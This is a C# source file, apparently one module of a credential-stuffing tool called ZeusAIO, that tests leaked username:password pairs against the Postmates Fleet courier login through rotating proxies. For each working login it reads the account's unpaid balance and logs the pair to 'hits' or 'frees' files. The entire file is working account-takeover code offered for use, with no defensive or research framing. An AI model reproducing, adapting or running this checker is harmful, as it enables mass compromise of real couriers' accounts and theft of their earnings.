using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Postmatesfleet
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("Pragma", "no-cache");
                            httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                            httpRequest.AddHeader("Host", "fleet.postmates.com");
                            httpRequest.AddHeader("Connection", "keep-alive");
                            httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                            httpRequest.AddHeader("Accept-Language", "en-US");
                            httpRequest.AddHeader("Referer", "https://fleet.postmates.com/login");
                            httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            string str = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://fleet.postmates.com/v1/login", str, "application/json;charset=UTF-8").ToString();
                            {
                                if (strResponse.Contains("client is not authenticated for this resource"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("\"auth_channel\":\"sign_in\""))
                                {
                                    httpRequest.ClearAllHeaders();
                                    httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                                    httpRequest.AddHeader("Pragma", "no-cache");
                                    httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                                    httpRequest.AddHeader("Host", "fleet.postmates.com");
                                    httpRequest.AddHeader("Connection", "keep-alive");
                                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                                    httpRequest.AddHeader("Accept-Language", "en-US");
                                    httpRequest.AddHeader("Referer", "https://fleet.postmates.com/dashboard");
                                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                    string cap = httpRequest.Get("https://fleet.postmates.com/v1/earnings_overview", null).ToString();
                                    string bal = Check.Parse(cap, "unpaid_balance\":", ",\"");
                                    if (bal.Contains("0"))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - POSTMATESFLEET] " + s[0] + ":" + s[1] + " | Balance: " + bal, Color.OrangeRed);
                                        }
                                        Export.AsResult("/Postmatesfleet_frees", s[0] + ":" + s[1] + " | Balance: " + bal);
                                        return false;
                                    }
                                    else
                                    {
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - POSTMATESFLEET] " + s[0] + ":" + s[1] + " | Balance: " + "$" + bal, Color.Green);
                                        }
                                        Export.AsResult("/Postmatesfleet_hits", s[0] + ":" + s[1] + " | Balance: " + "$" + bal);
                                        return false;

                                    }

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

